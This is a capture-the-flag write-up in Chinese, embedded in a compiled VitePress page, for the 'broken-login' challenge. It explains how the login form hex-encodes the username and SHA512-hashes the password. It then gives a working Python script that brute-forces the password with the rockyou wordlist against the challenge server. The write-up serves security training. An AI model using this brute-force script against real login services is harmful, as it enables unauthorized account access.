import{_ as s,c as i,o as a,a1 as n}from"./chunks/framework.BwTyoF0R.js";const g=JSON.parse('{"title":"broken-login ( Write Up )","description":"","frontmatter":{},"headers":[],"relativePath":"writeups/broken-login.md","filePath":"writeups/broken-login.md"}'),e={name:"writeups/broken-login.md"},t=n(`<h1 id="broken-login-write-up" tabindex="-1">broken-login ( Write Up ) <a class="header-anchor" href="#broken-login-write-up" aria-label="Permalink to &quot;broken-login ( Write Up )&quot;">​</a></h1><p><a href="https://app.cyber-edu.co/challenges/62bee6e0-356c-11eb-a033-199a06b529d6?tenant=cyberedu" target="_blank" rel="noreferrer">broken-login</a></p><h2 id="🔻-step-1-觀察與測試" tabindex="-1">🔻 Step 1. 觀察與測試 <a class="header-anchor" href="#🔻-step-1-觀察與測試" aria-label="Permalink to &quot;🔻 Step 1. 觀察與測試&quot;">​</a></h2><ol><li><p>網頁中有一個表單，包含兩個輸入值 &quot;name&quot; 和 &quot;password&quot;。</p></li><li><p>分別隨意輸入 <code>admin</code> 和 <code>123</code> 會發現網站導向 <code>/auth?username=61646d696e&amp;password=3c9909afec25354d551dae21590bb26e38d53f2173b8d3dc3eee4c047e7ab1c1eb8b85103e3be7ba613b31bb5c9c36214dc9f14a42fd7a2fdb84856bca5c44c2</code> 。</p></li><li><p>透過工具發現其中的 <code>61646d696e</code> 和 <code>3c9909afec25354d551dae21590bb26e38d53f2173b8d3dc3eee4c047e7ab1c1eb8b85103e3be7ba613b31bb5c9c36214dc9f14a42fd7a2fdb84856bca5c44c2</code> 分別為 Hex 格式與 SHA512 加密。</p></li><li><p>網頁始終呈現空的內容 -&gt; 可能導向錯的網址或是傳送錯的資料</p></li></ol><h2 id="🔻-step-2-修改與嘗試" tabindex="-1">🔻 Step 2. 修改與嘗試 <a class="header-anchor" href="#🔻-step-2-修改與嘗試" aria-label="Permalink to &quot;🔻 Step 2. 修改與嘗試&quot;">​</a></h2><ol><li><p>嘗試將 params 中的 <code>username=</code> 改為 <code>name=</code>，即 <code>/auth?name=61646d696e&amp;password=3c9909afec25354d551dae21590bb26e38d53f2173b8d3dc3eee4c047e7ab1c1eb8b85103e3be7ba613b31bb5c9c36214dc9f14a42fd7a2fdb84856bca5c44c2</code>，網頁回報 &quot;Invalid user&quot;。</p></li><li><p>藉由題目的提示，猜測 user 為 Alex，並將其轉換成 Hex 格式，得 <code>416c6578</code>。代入 <code>name</code> 後，網頁回報 &quot;Invalid password&quot;。 （若題目沒有提示，可能需要 Brute Force）</p></li></ol><h2 id="🔻-step-3-爆破攻擊" tabindex="-1">🔻 Step 3. 爆破攻擊 <a class="header-anchor" href="#🔻-step-3-爆破攻擊" aria-label="Permalink to &quot;🔻 Step 3. 爆破攻擊&quot;">​</a></h2><ol><li>在網路上找到 rockyou.txt 的 wordlist，使用 Python 撰寫 Brute Force 工具。</li><li>程式碼如下：</li></ol><div class="language-python vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">python</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">import</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> aiohttp</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">import</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> hashlib</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">import</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> asyncio</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">async</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> def</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> main</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">():</span></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # 載入 rockyou.txt 檔案</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    with</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> open</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;rockyou.txt&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">, </span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&#39;rb&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">) </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">as</span><span style="--shiki-light:#E36209;--shiki-dark:#FFAB70;"> file</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">: </span></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">        # 逐行讀取資料，並迴圈代入 p</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">        for</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> p </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">in</span><span style="--shiki-light:#E36209;--shiki-dark:#FFAB70;"> file</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">.readlines(): </span></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">            # 將讀取出的 p 值利用 SHA512 加密</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">            password </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> hashlib.sha512(p.strip()).hexdigest()</span></span>
<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">            print</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(password)</span></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">            # 利用 aiohttp 套件非同步傳送請求</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">            async</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> with</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> aiohttp.request(</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;GET&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">, </span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;http://34.159.104.59:32528/auth?name=416c6578&amp;password=&quot;</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> +</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> password) </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">as</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> r: </span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">                assert</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> r.status </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">==</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 200</span></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                # 讀取網頁 output 的資訊</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">                rtext </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">=</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> await</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> r.text()</span></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">                # 如果網頁 output 的內容不包含 &quot;Invalid&quot;，則停止迴圈</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">                if</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &#39;Invalid&#39;</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> not</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> in</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> rtext:</span></span>
<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">                    print</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(p, rtext)</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">                    break</span></span>
<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">                print</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(p, rtext)</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 利用 asyncio 非同步執行程式</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">asyncio.run(main())</span></span></code></pre></div><ol start="3"><li>爆破完以後，取得 Flag。</li></ol>`,10),p=[t];function l(h,k,r,d,o,c){return a(),i("div",null,p)}const y=s(e,[["render",l]]);export{g as __pageData,y as default};
